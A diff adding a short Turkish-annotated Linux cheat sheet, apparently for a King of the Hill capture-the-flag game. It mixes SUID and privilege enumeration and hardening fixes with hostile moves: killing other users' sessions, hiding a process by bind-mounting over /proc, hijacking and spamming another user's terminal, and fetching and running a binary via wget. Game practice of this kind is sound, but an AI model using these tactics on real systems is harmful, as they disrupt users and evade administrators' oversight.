@@ -1,0 +1,28 @@
+find / -perm -4000 2> /dev/null
+find / -perm -u=s -type f 2>/dev/null
+cat /etc/crontab
+sudo netstat -tulpn | grep LISTEN
+
+chmod u-s == SUİD PATCH
+chmod g-s filename == SGID PATH
+chattr -ai king.txt == chattr fix
+setcap -r /path/to/file == getcap fix
+find / -type f \( -perm -4000 -o -perm -2000 \) -print 2>/dev/null == bayaiyi
+----------------------------------------
+
+ps aux | grep pts == pts ini öprenmek için
+
+who -u == PID öğrenmek içim
+
+pkill -9 -t pts/1 == adamı session dan atmak için
+
+mount -o bind /tmp /proc/"who -u ile kendi process idin" invisible
+
+script -f /dev/pts/1 == direk adamın pc yi alıon
+
+for i in {1..100}; do echo "i own you"; done == adamdayken şaka amaçlı!
+
+nyancati wget ile tmp ye at, ./nyancat > /dev/pts/1
+
+./root.sh & == sınırsız king
+-----------------------------------------
